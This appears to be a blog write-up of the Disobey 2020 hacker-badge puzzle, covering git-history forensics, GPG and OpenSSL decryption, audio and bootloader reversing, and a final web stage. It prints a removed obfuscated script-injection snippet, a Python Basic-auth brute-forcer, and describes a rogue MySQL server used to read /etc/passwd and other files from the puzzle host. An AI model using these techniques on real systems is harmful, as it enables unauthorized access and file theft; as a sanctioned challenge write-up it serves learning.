---
layout: post
title:  "[0x3] Disobey 2020 puzzle writeup"
subtitle: "Hacker badge puzzle"
date:   2019-12-23 06:00:00
categories: [general, tools]
draft: false
author: whois
listImage: "default_post.png"
---

![image](/images/blog/disobey_owls.jpg)

> [Disobey](https://disobey.fi) is a Finnish hacker/cyber security conference. They release every year a hacker challenge and 50 first who solve it, get to buy the special "hacker ticket" with a cheaper price than a regular ticket. The badge that comes with the ticket is also visually different looking than a normal ticket. At the first I have to admit, this year the challenge was harder than in previous years. This was my third time I tried to do the challenge and the third time I managed to solve it. As the challenge started at the same weekend as Assembly LAN party was held, we decided to give it a try together with [Dist](https://www.twitter.com/dist) and [Jaroneko](https://www.twitter.com/jaroneko) as a team. There's probably multiple different ways to solve it but here's my take with some arguments why I did what I did. Hope you enjoy the read and even learn something from it!

## \_start

Disobey has a "DISOBEY PUZZLE" partition on their webpage with a link. When you click the link open, [Gitbub pages site](https://disobey2020.github.io/) should open. GH pages are a way to host website from a github repo. Probably we can find something from [Github](https://github.com/disobey2020/disobey2020.github.io) then...?

The repository was a lot different looking back then than it is today. People have made lot of pull requests and most of them have been accepted. This kinda makes the commit history harder to read but let's see what's in there. I cloned the repo and ran "git log" against it.

```
 whois@cypher → ~/gits/ → git clone https://github.com/disobey2020/disobey2020.github.io
 whois@cypher → ~/gits/ → cd disobey2020.github.io
 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git log

commit 9ca710048f495d4ccf25ac268a432d75dda010ee
Merge: 8811b77 4517bd0
Author: disobey2020 <53083375+disobey2020@users.noreply.github.com>
Date:   Wed Jul 24 11:53:50 2019 +0300

    Merge pull request #3 from disobey2020/vuln_fix

    Removed malicious code

commit 8811b77cf362f3cf97765f03fd367f9590ffc101
Author: Diso Bey <disobey2020@io.fi>
Date:   Fri Jul 19 16:46:19 2019 +0300

    Add robots.txt

commit cf2e99542f8c9d6fe1df86d6bb2804c02f20c95e
Author: disobey2020 <53083375+disobey2020@users.noreply.github.com>
Date:   Fri Jul 19 14:53:00 2019 +0300

    Create README

commit af88c9a987df81cfc5d0ea8f0d413d9890143026
Merge: a8e04ac 0ac77ce
Author: disobey2020 <53083375+disobey2020@users.noreply.github.com>
Date:   Fri Jul 19 14:51:25 2019 +0300

    Merge pull request #1 from 0x4141414141414141/effect

    Add cool effect to the header text

commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
Author: AAAAAAAA <0x41414141414141@protonmail.com>
Date:   Fri Jul 19 14:47:12 2019 +0300

    Add cool effect to the header text

commit a8e04ac1e014ef0aaf55eb6daadd6a6d66a349e1
Author: Diso Bey <disobey2020@io.fi>
Date:   Mon Jul 1 01:01:01 2019 +0300

    Initial commit

commit 4517bd04e348c331837fa8833810cbba465618c9
Author: Diso Bey <disobey2020@io.fi>
Date:   Thu May 16 01:00:45 2019 +0300

    Removed malicious code

```

The first thing I saw was the commit 4517bd04e348c331837fa8833810cbba465618c9. I really wanted to know what the malicious code was so I checked the specific commit.

```
whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git show 4517bd04e348c331837fa8833810cbba465618c9

commit 4517bd04e348c331837fa8833810cbba465618c9
Author: Diso Bey <disobey2020@io.fi>
Date:   Thu May 16 01:00:45 2019 +0300

    Removed malicious code

diff --git a/index.html b/index.html
index 6f95a95..6045303 100755
--- a/index.html
+++ b/index.html
@@ -53,9 +53,6 @@
                          crossorigin="anonymous"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script>
   <script>
-var _0x4311=['.fi','/ma','l.js','write','<script\x20src=\x22','s://','0x42'];(function(_0x426e03,_0x359476){var _0x17c635=function(_0x5dfa16){while(--_0x5dfa16){_0x426e03['push'](_0x426e03['shift']());}};_0x17c635(++_0x359476);}(_0x4311,0x9f));var _0x5a74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4311[_0x2d8f05];return _0x4d74cb;};var f1='hT';var f2='tP';var f3=_0x5a74('0x0');var f4=_0x5a74('0x1');var f5=_0x5a74('0x2');var f6=_0x5a74('0x3');var f7=_0x5a74('0x4');document[_0x5a74('0x5')](_0x5a74('0x6')+f1+f2+f3+f4+f5+f6+f7+'\x22><\/script>');
-  </script>
-  <script>
   // Wrap every letter in a span
   $('.ml9 .letters').each(function(){
     $(this).html($(this).text().replace(/([^\x00-\x80]|\w)/g, "<span class='letter'>$&</span>"));
```

Nasty! Index.html has had some obfuscated JavaScript in it. I know lot of people run this kind of stuff on their host's browser but as I do this kind of analysis as my work, I would not recommend doing it. To analyze this JS, I ran it with SpiderMonkey on my Remnux virtual machine. Remnux ships with a tool called SpiderMonkey. SpiderMonkey is a tool for evaling obuscated JS.

```
remnux@remnux:~/disobey$ js -f /usr/share/remnux/objects.js -f mal.js 
<script src="hTtPs://0x42.fi/mal.js"></script>
```

Okay so the obfuscated JS just loads another JS to the website from suspicious domain 0x42.fi. Unfortunately, 0x42.fi resolves to localhost. Let's see other DNS record types as well than just the A record.

```
 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host 0x42.fi

0x42.fi has address 127.0.0.1

 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t TXT 0x42.fi
0x42.fi descriptive text "if you are doing bruteforcing, or domain / ip recon you are doing it wrong. The glaciers are shrinking fast enough without that."
0x42.fi descriptive text "See first, think later, then test. But always see first. Otherwise you will only see what you were expecting. Most scientists forget that."
0x42.fi descriptive text "ca3-cb8d6ea4479349af8295f8ea0115af57"
0x42.fi descriptive text "History data for this domain is out of scope."
0x42.fi descriptive text "Can't we have nice things?      [in narrator voice]: 'They could not'"
0x42.fi descriptive text "If you didn't know history, you didn't know anything. You were a leaf that didn't know it was part of a tree."

 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t AAAA 0x42.fi
0x42.fi has no AAAA record

 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t MX 0x42.fi
0x42.fi has no MX record

 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → host -t CNAME 0x42.fi
0x42.fi has no CNAME record
```

As we can see, only TXT record returns us something. By little googling, ca3-md5hash seems to have something to do with let's encrypt so probably it is nothing. I guess these phrases are just a verbal finger for the solver so let's start all over again.

We can see from the commit history that the malicious code was added to the repository in the following commit.

```
commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
Author: AAAAAAAA <0x41414141414141@protonmail.com>
Date:   Fri Jul 19 14:47:12 2019 +0300

    Add cool effect to the header text
```

User 0x4141414141414141 looks interesting. Protonmail and everything, very suspicious... Let's look how their Github looks...

![image](/images/blog/mrAAA.png)

We can see emojis 💭 and 🔑 below the avatar. This must have something to do with a challenge... This user has one repo, which has three files and they all are called "Keyholes". The emojis must be a hint how to open these keyfiles. Let's clone the files and let's see what they are.

```
 whois@cypher → ~/gits → git clone https://github.com/0x4141414141414141/proof.git
Cloning into 'proof'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 8 (delta 0), pack-reused 0
Unpacking objects: 100% (9/9), done.
 whois@cypher → ~/gits → cd proof
 whois@cypher → ~/gits/proof → ↑ master → l
total 13824
drwxr-xr-x   6 whois  staff   192B Nov 20 00:08 .
drwxr-xr-x  11 whois  staff   352B Nov 20 00:08 ..
drwxr-xr-x  12 whois  staff   384B Nov 20 00:08 .git
-rw-r--r--   1 whois  staff   6.6M Nov 20 00:08 keyhole
-rw-r--r--   1 whois  staff   1.5K Nov 20 00:08 keyhole2
-rwxr-xr-x   1 whois  staff   130K Nov 20 00:08 keyholekeyhole2_pbkdf2
 whois@cypher → ~/gits/proof → ↑ master → file *
keyhole:                openssl enc'd data with salted password
keyhole2:               openssl enc'd data with salted password
keyholekeyhole2_pbkdf2: openssl enc'd data with salted password
```

As we can see from the output, files are openssl encrypted data. Now I guess we have to find the passwords for those "keyholes". Let's go back and investigate the specific commit more... Keys usually have something to do with PGP and git commits are signed with PGP... Let's see what the signature says in this specific commit.

```
 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → git show --show-signature 0ac77ce7b261eaad945219cd2b1349fc7041a814
commit 0ac77ce7b261eaad945219cd2b1349fc7041a814
gpg: Signature made Fri Jul 19 14:47:12 2019 EEST
gpg:                using RSA key 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
gpg: Good signature from "AAAAAAAA (SKS Keyserver Network Under Attack) <not@valid>" [unknown]
gpg:                 aka "AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) <0x41414141414141@protonmail.com>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: 1F8D A40B 1C5C EA33 52D5  6546 65F6 7D98 EBE2 7E12
Author: AAAAAAAA <0x41414141414141@protonmail.com>
Date:   Fri Jul 19 14:47:12 2019 +0300

    Add cool effect to the header text
```

My first though was "what is this SKS Keyserver Network Under Attack shit" and I decided to use every hacker's secret tool Google to solve it. I felt lucky and ended up to [this Github page](https://gist.github.com/rjhansen/67ab921ffb4084c865b3618d6955275f). After reading the article and understanding some of it, I tried to retrieve this key from a server.


```
whois@cypher → ~/gits/disobey2020.github.io → ↑ master → gpg --search-keys 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
gpg: data source: https://192.146.137.99:443
(1)	AAAAAAAA (SKS Keyservers under attack) <not@valid>
	AAAAAAAA (SKS Keyserver Network Under Attack) <not@valid>
	AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) <0x41414
	  4096 bit RSA key 65F67D98EBE27E12, created: 2019-07-19, expires: 2020-07-18
Keys 1-1 of 1 for "1F8DA40B1C5CEA3352D5654665F67D98EBE27E12".  Enter number(s), N)ext, or Q)uit > n
```

It looks like I got the same key right? Let's fix my GPG configuration before retrying the way previosly mentioned Github page says.

```
 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → gpg --search-keys 1F8DA40B1C5CEA3352D5654665F67D98EBE27E12
gpg: data source: https://keys.openpgp.org:443
(1)	AAAAAAAA (5768657265446F6573546869734B65794669743F) <0x41414141414141@
	AAAAAAAA (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) <0x41414
	  4096 bit RSA key 65F67D98EBE27E12, created: 2019-07-24
Keys 1-1 of 1 for "1F8DA40B1C5CEA3352D5654665F67D98EBE27E12".  Enter number(s), N)ext, or Q)uit > n
```

Now we seem to have different key with different uid. Uid description looks like hexa, is it?

```
 whois@cypher → ~/gits/disobey2020.github.io → ↑ master → echo "5768657265446F6573546869734B65794669743F" |xxd -r -p
WhereDoesThisKeyFit?%
```

It indeed was. :D Now we have a key and earlier we got keyholes, let's see if our retrieved key fits the hole...

```
 whois@cypher → ~/gits/proof → ↑ master → rm file
 whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyhole -out file
enter aes-256-cbc decryption password:
 whois@cypher → ~/gits/proof → ↑ master → file file
file: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 44100 Hz
 whois@cypher → ~/gits/proof → ↑ master → mv file file.riff
 whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyhole2 -out file
enter aes-256-cbc decryption password:
 whois@cypher → ~/gits/proof → ↑ master → file file
file: DOS/MBR boot sector
 whois@cypher → ~/gits/proof → ↑ master → mv file bootloader
 whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -in keyholekeyhole2_pbkdf2 -out file
enter aes-256-cbc decryption password:
bad decrypt
4510240364:error:06FFF064:digital envelope routines:CRYPTO_internal:bad decrypt:/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.11.1/libressl-2.8/crypto/evp/evp_enc.c:521:
```

Okay, so the retrieved password worked to keyhole and keyhole2 but not to keyholekeyhole2_pbkdf2. To be honest here, the decryption wasn't that smooth while doing the challenge first time. Organizers said bruteforcing is not needed in the challenge but at least I had to try [hard] all ciphers and digests before I managed to open the first keyhole. Also funny note, depending on the OpenSSL version default digest might be different. On OS X I had LibreSSL 2.8.3 which has SHA1 as defaul digest while on my Manjaro machine with OpenSSL 1.1.1d the default digest is SHA256.

## keyhole

Let's move forward. We have now two different files: somekind of sound file and a DOS/MBR boot sector. Let's start with the soundfile.

{{< audio src="/sound/mörkö.wav" >}}

It plays nicely and sounds like a bogey ("MÖRKÖ"). :D It also sounds the tape is backwards so let's try to reverse it. As I don't know that much about signals and stuff and have only resolved these kind of challenges in CTFs, I will use noobfriendly tool Audacity for reversing. The reversing process was pretty easy in Audacity. Let's here what the mörkö has to say backwards.

{{< audio src="/sound/mörköreversed.wav" >}}

Sounds like the bogey is pronouncing some numbers right? Let's try to clear up the back noise so we can here what he has to say.

{{< audio src="/sound/mörköcleaned.wav" >}}

Alrighty, now we can here the numbers loud an clear. No matter how many times I listen it, I get the following sequence of numbers:

```
1010101010568605568605568605379037968605
```

This sequence doesn't really return anything that makes sense. If we reverse the string and then turn it into ascii from hexa, we get some printable characters but it doesn't make sense.

```
whois@cypher → ~/gits/proof → ↑ master → echo "1010101010568605568605568605379037968605" |rev|xxd -r -p
Phis	sPhePhePhe%
```

This was the phase we were stuck for almost 36 hours... :D Those 36 hours were pretty long especially when we managed to solve the whole challenge in 4 days! BUT.. let's assume the first letter is 'T' so that the string would start with a English word 'This'. Hex value of capital 'T' is 54. What if instead of "ou" the bogey is trying to say "four" ? Let's try that.

```
 whois@cypher → ~/gits/proof → ↑ master → echo "1010101010568605568605568605379037968605" |tr '0' '4'|rev|xxd -r -p
ThisIsTheTheTheAAAAA%
```

Boom!!! Looks like we solved the bogey and opened our first keyhole. Based on the keyhole names, this is probably the first part of a password that fits the keyholekeyhole2_pbkdf2. The password string also supports our story.

## keyhole2

Now we get into the business: DOS/MBR boot sector image file. Oh boy, this is gonna be [K4M1](https://twitter.com/_k4m1_) level good once again.

```
whois@cypher → ~/gits/proof → ↑ master → file bootloader
bootloader: DOS/MBR boot sector
```

Running strings against the image just prints us a "Invalid CPU!". I never though strings could tell us anything but it is always worth to try (protip: sometimes piping grep with strings is good as well, ping iiro). So let's roll up our sleeves and start debugging... As I happen to have access to IDA Pro, I used it for debugging. It doesn't really matter which debugger/disassembler you use... You can easily do the task with radare2 or ghidra. =)

So, the most common architectures what I have seen are ARM, i386, x86 and x64. As ARM emulating with QEMU did not work, I tried i386 and managed to run the program on my Windows virtual machine. I started QEMU with following parameters to enable multiple serials, allocate enough memory for it, to enable remote debugging and to pause execution at the start. Without pausing the execution, I got print "WRONG" on the serial0 console window.

![image](/images/blog/qemu0.png)

```
C:\Users\Rodrigo Gonzales>"C:\Program Files\qemu\qemu-system-i386.exe" -drive format=raw,file=Desktop/bootloader -serial vc -serial vc -serial vc -serial vc -m 512 -S -s
```

Little googling about bootloaders gave a hint that bootloader should be initiazlied at 0x7C00. I set a breakpoint to that address and let the program continue. After getting there, I saw some kind of unpacking function starting... Single stepping was painful so I decided to let the program run for a while.

After stopping the software, I saw we ended up seeing the "WRONG" text in our serial0 and EIP was at 0x3028. The loop function at that location seemed to write some shit to addresses between 0x2328 and 0x303F. At the time, there was some still some ascii characters in addresses between 0x3000 and 0x3027. Now we roughly know that probably there's something in this address space. I decided to re-run the program and set breakpoint to 0x3000, which had hex-value 0x66 (ascii letter f) at this point.

The execution reached the breakpoint and oh boy, we can see assembly once again!!! 

![image](/images/blog/ida1.png)

The first instructions don't look that interesting as it seems they are just defining some register values and checking CPU architecture. The jump to 0x303F takes us to start of the program.

```
MEMORY:0000303F loc_303F:                               ; CODE XREF: MEMORY:00003010↑j
MEMORY:0000303F mov     dx, 3F8h
MEMORY:00003043 mov     si, 3157h
MEMORY:00003047 mov     cx, 317Fh
MEMORY:0000304B rep outsb
MEMORY:0000304D xor     al, al
MEMORY:0000304F jz      short near ptr loc_3051+1
```

![image](/images/blog/qemu1.png)

At 0x304B program prints "Place flag to 0x3000 in RAM please :)". After that AL is cleared with XOR and the execution continues. At 0x304F is suspicious jump instruction to function at 0x3051+1, which is not dissassembled in the IDA. Function at 0x3051 looks shady thou:

![image](/images/blog/ida2.png)

Let's try to undefine it and re-analyze with IDA.

![image](/images/blog/ida3.png)

![image](/images/blog/ida4.png)

![image](/images/blog/ida5.png)

After re-analyze the function looks a lot better. We can see that the program compares the first letter of the memory address 0x3000 to 0x42, which is letter B. If the first letter is not B (comparasion between AL and the first letter of our flag is not zero), the jump will be taken to loc_3114. That location is the place where the "WRONG" we saw first is written to the TTY.

![image](/images/blog/ida6.png)

Next instruction decreases value of AL by one so it becomes 0x41 (A). After that the second letter of our flag at byte_3001 is compared to AL value (0x41) and if they are equal, jump to loc_3114 ("WRONG)") is taken.

![image](/images/blog/ida7.png)

At 0x307D next byte in our flag is re-compared to 0x42 (B). By that, we know that the first two letters in the flag are BB.

![image](/images/blog/ida8.png)

As we can see from the previous image, at 0x308A two bytes (word) from our flag are being loaded to EAX. These two bytes are the 5th and the 6th letter of our flag. AL register is the second part of EAX and compared first. As we can see from the instuctions, hex-value 32 is added to value of AL and then compared to 0x7B. This means our fifth letter is 0x7b ({) - 0x32 = 0x49 (I). Reversed flag so far: BB__I (__ are unknown letters at this point)

At 0x309D hex-value 20 is being reduced from the value of the first byte of our word and then compared to hex-value 54.  By reversing this very hard mathematical function, we get the value 0x74 (0x54+0x20) which tranforms to ascii letter t. Reversed flag so far: BB__It

![image](/images/blog/ida9.png)

The next mov to AX is from word_3002. Then the register is being pushed and BX popped. This sequence copies the AX value to BX.

As we can see from the operand, the value of word_3002 can be calculated by undoing AND operation to 0x0202 with 0x0F0F.

```
XXXX XXXX XXXX XXXX 
0000 1111 0000 1111
-------------------
0000 0010 0000 0010

-->

1111 0010 1111 0010: F2F2
```

Let's continue. Next we compare the value stored to BX with similar function.


```
MEMORY:000030B9 xor     bx, 202h
MEMORY:000030BE cmp     bx, 4040h
```

This time it's XOR instead of AND. Now we know that result of our BX value with 0x0202 should be 0x4040.

```
XXXX XXXX XXXX XXXX 
0000 1111 0000 1111
-------------------
0100 0000 0100 0000

-->

0100 0000 0100 0000: 4040
```

As we can see, the 3rd and 4th character are being compared in two different operations. By combining these two values we get 4242 (BB). Reversed flag so far: BBBBIt

Next the function at loc_3127 is being called. The function has some kind of loop, where the start address is 0x3000 and the end address 0x3157. The loop compares if any byte of the flag at 0x3000 has value 0xDA. 

![image](/images/blog/ida10.png)

I set up a breakpoint to 0x3141 and the execution finally rechead it. We might need to come back here and continue debugging if the 0xDA should be in our flag. At this point I thought it's highly unlike as the Ascii value of 0xDA is Ú.

Return takes us back to 0x30CA where we jump to 0x30D1. At 0x30D1 our next characters gets loaded to EAX. Next the software increases AL value by one at 0x30D6. After that we jump to 0x30DE where the AL gets compared to 0x47 (G). As we just increased the value by 1, the 7th letter is 0x47 - 1 = 0x46 (F). Now we know the password starts BBBBItF.

![image](/images/blog/ida11.png)

Next the programn shifts EAX 8 bits with SHR. After that AL is being checked not to be 0x47 (G). As the jump is taken to WRONG only if letter equals to G, we can ignore the shr instruction at this point. In 0x30e9 AL is compared to 0x69 (i) and then the execution continues. By that i seems to be our 8th character. Reversed flag so far: BBBBItFi

The next part is once again kinda shady. We have a jump to loc_30EF+2 which is loc_30F1, how ever the dissassembled code does not show us this location. Let's try to jump there and then re-analyze the address.

Before:
![image](/images/blog/ida12.png)

After:
![image](/images/blog/ida13.png)

It worked =). At 0x30F1 latter word from EAX is shifted to AX and at 0x30F4 hex-values 0x73 and 0x74 are being compared to it. Hex-values 0x73 and 0x74 are ascii letters t and s. Reversed flag: BBBBItFits

After the operation, "Correct" is printed to TTY0 at 0x3106. At last we can try our reversed flag by inserting it to memory address 0x3000 and letting the program to execute.

![image](/images/blog/ida14.png)

![image](/images/blog/qemu2.png)

Whoop whoop, thanks a lot @K4M1 for the fun ride!


## keyholekeyhole2_pbkdf2

If we combine the flags we got from keyhole and keyhole2, we get the assumed masterkey for the last known keyhole.

```
ThisIsTheTheTheAAAAABBBBItFits
```

Let's fire away our last keyhole with the key. =)

```
 whois@cypher → ~/gits/proof → ↑ master → openssl enc -d -aes-256-cbc -md sha256 -salt -pbkdf2 -in keyholekeyhole2_pbkdf2 -out lasthole
enter aes-256-cbc decryption password:

 whois@cypher → ~/gits/proof → ↑ master → Desktop file lasthole 
lasthole: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "https://db.0n.fi/", progressive, precision 8, 1600x1200, components 3
```

Great, we have a picture, I love stegano (NOT). Let's see how bad it looks...

![image](/images/blog/lasthole.jpg)

So... It's once again some boogeyman stuff. If we lighten the picture a little, we can see that the balloons have a string "mehram" written in them. Mehram is anagram for "hammer" and if we read balloons from the smallest to biggest, we get also the string "hammer".

![image](/images/blog/mehram.png)

```
 whois@cypher → ~/gits/proof → ↑ master → exiftool lasthole.jpg
ExifTool Version Number         : 11.59
File Name                       : lasthole.jpg
Directory                       : .
File Size                       : 130 kB
File Modification Date/Time     : 2019:12:19 21:56:54+02:00
File Access Date/Time           : 2019:12:19 21:59:06+02:00
File Inode Change Date/Time     : 2019:12:19 21:59:05+02:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Comment                         : https://db.0n.fi/.Q2FuJ3QgVG91Y2ggVGhpcw==
Image Width                     : 1600
Image Height                    : 1200
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1600x1200
Megapixels                      : 1.9
```

Exiftool shows some interesting info about the photo. Comment has some URL on it and it has base64 after it.

```
 whois@cypher → ~/Disobey2020 → echo "Q2FuJ3QgVG91Y2ggVGhpcw==" |base64 -d
Can't Touch This
 whois@cypher → ~/Disobey2020 → curl https://db.0n.fi/
<html>
<head><title>401 Authorization Required</title></head>
<body bgcolor="white">
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>

```

Oh... It's hammer time... The site seems to be alive. HTTP 401 is telling us we need to authenticate first. As we already know some words, lets put them on the list and bruteforce!

```
 whois@cypher → ~/Disobey2020 → cat words.txt
mehram
hammer
MEHRAM
HAMMER
Can't Touch This
Q2FuJ3QgVG91Y2ggVGhpcw==
```

I wrote a little python script for the bruteforce. It's not beautiful but it's working. But actually it's AI as it has multiple if statements... :D


```
 whois@cypher → ~/Disobey2020 → cat bruteforcer.py 
import requests
import sys
import time

filetoopen=sys.argv[1]

with open(filetoopen,"r") as usernames:
  for l1 in usernames:
    with open(filetoopen, "r") as passwords:
      for p1 in passwords:
        username = l1.replace('\n', '')
        password = p1.replace('\n', '')
        while True:
          r = requests.get("https://db.0n.fi/", auth=(username, password))
          if(r.status_code==429):
            time.sleep(1)
            continue
          if(r.status_code!=401):
            print("[+] Working creds found: %s:%s" % (username, password))
            sys.exit(1)
          if(r.status_code==401):
            print("[-] Incorrect: %s:%s" % (username, password))
            break

 whois@cypher → ~/Disobey2020 → python3 bruteforcer.py words.txt          
[-] Incorrect: mehram:mehram
[-] Incorrect: mehram:hammer
[-] Incorrect: mehram:MEHRAM
[-] Incorrect: mehram:HAMMER
[-] Incorrect: mehram:Can't Touch This
[-] Incorrect: mehram:Q2FuJ3QgVG91Y2ggVGhpcw==
[-] Incorrect: hammer:mehram
[-] Incorrect: hammer:hammer
[-] Incorrect: hammer:MEHRAM
[-] Incorrect: hammer:HAMMER
[-] Incorrect: hammer:Can't Touch This
[+] Working creds found: hammer:Q2FuJ3QgVG91Y2ggVGhpcw==
```

And against all odds, we got working username:password combination. The base64 string said "Can't Touch This" which now totally makes sense as the encoded string was the password.

## \_dbfun

After we authenticate with Basic AUTH, we get to the some kind of db connect site.

![image](/images/blog/db.png)

Clicking "connect" we get following error message:

```
Connect failed, check hostname: php_network_getaddresses: getaddrinfo failed: Name or service not known
```

Time to open BURP Suite and investigate the connection more... :) After setting up a foxyproxy, I intercepted the POST request which is send when you click "CONNECT" on the database connection site and sent it to repeater. Now I can edit the request and see how the endpoint reacts to my changes.

![image](/images/blog/burp1.png)

As the error message says "check hostname", we decided to try and give the server hostname as a parameter. Sending "hostname=127.0.0.1" seemed to work as we got new error message...

![image](/images/blog/burp2.png)

Next we wanted to see if we could make the server to contact my own server. I set up an server for this purpose only to DigitalOcean. As a lazy man, installing databases is too time consuming so I decided to use netcat.

![image](/images/blog/burp3.png)

![image](/images/blog/digitalocean1.png)

We got a connection from the server!! Super. Now we just need to figure out what to do next.

At this point I remembered reading from [Jarkko Vesiluoma's blog](https://www.vesiluoma.com/abusing-mysql-clients/) about LFI (Local File Inclusion) in MySQL client. After re-reading it and googling a round little, I managed to find this rogue [MySQL server script](https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue_mysql_server.py) from GitHub, which should do the needfull for us. I set it up to my DigitalOcean server and happily saw that we got /etc/passwd as a response from db.0n.fi !!!!

![image](/images/blog/digitalocean2.png)

We started reading all files from the server. Finally we ended up checking index.php and found the following:

![image](/images/blog/digitalocean3.png)

It's there: https://holvi.com/shop/Disobey/product/8df92c434d4e765189d54dda5736e3c3

We got the ticket link and finished 1st (well 1st, 2nd and 3rd) in the race.. :) 

## Conclusion

This year the hacker badge challenge was IMHO harder than last year. I think I learned a lot on the journey even though there wasn't anything mind blowing. I liek'd reverse part the most. Thanks for all who were involved in making the challenge and my team mates (Dist & Jaroneko) who shared the mental break down during the via dolorosa... See you all in Disobey!

P.S. If you have something to ask/comment about this writeup, please contact me on [Twitter](https://twitter.com/JuhoJauhiainen). 
